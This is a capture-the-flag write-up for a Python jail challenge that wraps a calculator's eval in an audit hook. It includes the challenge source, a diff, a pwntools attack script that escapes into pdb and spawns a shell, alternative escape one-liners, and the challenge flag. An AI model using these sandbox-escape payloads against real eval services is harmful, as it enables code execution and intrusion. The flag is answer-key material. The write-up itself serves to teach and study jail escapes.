# clac defanged

```
based off of calc for ictf 2024 by maple3142

i tried modifying it to make it modular but i think now the calculator is insecure...

this challenge is not as tricky as it looks!

nc challs1.pyjail.club 23612
```

Attachment:

```python
#!/usr/local/bin/python3
from sys import addaudithook
from os import _exit
from re import match


def safe_eval(exit, code):
    def hook(*a):
        exit(0)
    def disabled_exit(*a):
        pass

    def dummy():
        pass

    dummy.__code__ = compile(code, "<code>", "eval")
    print("Activating audit hook...")
    addaudithook(hook)
    val = dummy()
    # audit hooks do not allow me to do important stuff afterwards, so i am disabling this one after eval completion
    # surely this won't have unintended effects down the line, ... right?
    print("Disabling audit hook...")
    exit = disabled_exit
    return val


if __name__ == "__main__":
    expr = input("Math expression: ")

    if len(expr) <= 200 and match(r"[0-9+\-*/]+", expr):
        # extra constraints just to make sure people don't use signal this time ...
        if len(expr) <= 75 and ' ' not in expr and '_' not in expr:
            print(safe_eval(_exit, expr))
        else:
            print('Unacceptable')
    else:
        print("Do you know what is a calculator?")
```

Diff with [ImagbinaryCTF 2024 calc](../misc/pyjail/imaginaryctf-2024-calc.md):

```diff
--- main.py	2025-10-04 10:47:50.177404199 +0800
+++ calc.py	2025-10-04 10:51:11.871714435 +0800
@@ -1,4 +1,4 @@
-#!/usr/local/bin/python3
+#!/usr/bin/env python3
 from sys import addaudithook
 from os import _exit
 from re import match
@@ -7,31 +7,18 @@
 def safe_eval(exit, code):
     def hook(*a):
         exit(0)
-    def disabled_exit(*a):
-        pass
 
     def dummy():
         pass
 
     dummy.__code__ = compile(code, "<code>", "eval")
-    print("Activating audit hook...")
     addaudithook(hook)
-    val = dummy()
-    # audit hooks do not allow me to do important stuff afterwards, so i am disabling this one after eval completion
-    # surely this won't have unintended effects down the line, ... right?
-    print("Disabling audit hook...")
-    exit = disabled_exit
-    return val
+    return dummy()
 
 
 if __name__ == "__main__":
     expr = input("Math expression: ")
-
     if len(expr) <= 200 and match(r"[0-9+\-*/]+", expr):
-        # extra constraints just to make sure people don't use signal this time ...
-        if len(expr) <= 75 and ' ' not in expr and '_' not in expr:
-            print(safe_eval(_exit, expr))
-        else:
-            print('Unacceptable')
+        print(safe_eval(_exit, expr))
     else:
         print("Do you know what is a calculator?")
```

1. Extra constraints: length less than or equal to 75, no spaces, no underscores: use `\x5f` instead of `_` in string to bypass limitation, use `setattr(A,B,C)` instead of `A.B=C`
2. Disable audit hook after calling `dummy`: return a object whose `__str__` evaluates `breakpoint()`, using the `[f"{license}" for license._Printer__setup in [breakpoint]]` snippet from [pyjail cheatsheet](https://shirajuki.js.org/blog/pyjail-cheatsheet/)

Attack script:

```python
from pwn import *

context(log_level="debug")

#p = process(["python3", "main.py"])
p = remote("challs1.pyjail.club", 23612)
p.recvuntil(b"expression:")
p.sendline(
    ("1,setattr(license,'\\x5fPrinter\\x5f\\x5fsetup',breakpoint),license").encode()
)
p.sendline(b'__import__("os").system("sh")')
p.interactive()
```

Steps:

1. Set `license._Printer__setup` to `breakpoint`
2. Return `license`
3. `print(license)` calls `license._Printer__setup`
4. Enters PDB
5. Get shell

Flag: `jail{this_python_ain't_so_scary_anymore_when_defanged_73ef638f5110dc0660d01a}`.

An elegant and simple solution is provided by @mirelgigel at [mirelgigel/writeupjailctf](https://github.com/mirelgigel/writeupjailctf): `0,type('',(),{'\x5f\x5frepr\x5f\x5f':lambda s:open('flag.txt').read()})()`, which creates a type with `__repr__` defined. A similar one is provided by @flocto on Discord: `1,[u:=chr(95)*2,e:=help,setattr(type(e),u+'repr'+u,lambda*a:exec(input()))]`.
